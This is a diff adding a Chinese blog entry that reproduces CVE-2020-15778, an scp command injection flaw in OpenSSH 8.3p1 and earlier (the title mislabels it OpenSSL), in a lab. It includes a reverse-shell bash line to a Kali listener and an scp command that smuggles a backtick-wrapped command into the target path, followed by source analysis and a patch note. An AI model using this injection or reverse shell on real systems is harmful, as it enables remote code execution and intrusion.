@@ -455,4 +455,75 @@ find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;
 </blockquote>
 ]]></content>
   </entry>
+  <entry>
+    <title></title>
+    <url>/2021/04/10/CVE-2020-15778%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<hr>
+<h2 id="CVE-2020-15778-OpenSSL漏洞复现"><a href="#CVE-2020-15778-OpenSSL漏洞复现" class="headerlink" title="CVE-2020-15778 OpenSSL漏洞复现"></a>CVE-2020-15778 OpenSSL漏洞复现</h2><h1 id="CVE-2020-15778-OpenSSL"><a href="#CVE-2020-15778-OpenSSL" class="headerlink" title="CVE-2020-15778 OpenSSL"></a>CVE-2020-15778 OpenSSL</h1><p><strong>影响版本</strong>：</p>
+<blockquote>
+<p>OpenSSH &lt;= 8.3p1 </p>
+</blockquote>
+<p><strong>漏洞介绍</strong></p>
+<blockquote>
+<p>漏洞公开披露2020年7月18日，openssh 8.3p1的SCP命令存在命令注入漏洞，攻击者可以利用此漏洞执行任意命令。</p>
+</blockquote>
+<p><strong>局限性</strong></p>
+<blockquote>
+<p>适用范围小，需要知道root用户密码，最大最用为ssh无法连接，但scp可以使用时</p>
+</blockquote>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote>
+<p>使用iptables策略搭建环境，禁用ssh登录，只保留scp(CentOS)</p>
+</blockquote>
+<ol>
+<li><strong>关闭自带防火墙(firewalld)</strong></li>
+</ol>
+<pre class=" language-shell"><code class="language-shell">停止firewalld服务 
+$ systemctl stop firewalld
+</code></pre>
+<ol start="2">
+<li><strong>设置iptables策略</strong></li>
+</ol>
+<pre class=" language-shell"><code class="language-shell">service iptables start
+iptables -t filter -A INPUT -p tcp --dport 22 -m tos --tos 0x10 -j DROP
+service iptables save
+iptables -L -n --line-number 
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224210808492.png" alt="image-20210224210808492"></p>
+<p><strong>验证</strong></p>
+<blockquote>
+<p>scp功能正常使用，但是ssh在输入密码后，无任何回响，无法连接，证明iptables策略成功有效。</p>
+</blockquote>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211255664.png" alt="image-20210224211255664"></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211123362.png" alt="image-20210224211123362"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>在kali里面新建1.sh，写入反弹shell的bash命令</strong></p>
+<pre class=" language-shell"><code class="language-shell">bash -i >& /dev/tcp/10.7.5.120>&1
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211415668.png" alt="image-20210224211415668"></p>
+<p><strong>kali监听6666端口</strong></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211522082.png" alt="image-20210224211522082"></p>
+<p><strong>使用scp命令传输文件到CentOS的/tmp目录</strong></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211630066.png" alt="image-20210224211630066"></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211703168.png" alt="image-20210224211703168"></p>
+<p><strong>命令执行，运行1.sh</strong></p>
+<pre class=" language-shell"><code class="language-shell">scp 1.sh root@192.168.1.135:/'`sh /tmp/1.sh`'
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211800626.png" alt="image-20210224211800626"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><blockquote>
+<p>scp命令源码</p>
+</blockquote>
+<pre class=" language-shell"><code class="language-shell">if (remin == -1) &#123;
+    xasprintf(&bp, "%s -t %s%s", cmd,
+        *targ == '-' ? "-- " : "", targ);
+    if (do_cmd(thost, tuser, tport, bp, &remin,
+        &remout) < 0)
+        exit(1);
+    if (response() < 0)
+        exit(1);
+    free(bp);
+&#125;
+</code></pre>
+<p><strong>当执行本地scp命令时，scp不会检查、过滤和清除文件名。这使得攻击者执行带有反引号的有效scp命令时，本地shell还将执行反引号中的命令。</strong></p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>补丁/升级</p>
+]]></content>
+  </entry>
 </search>
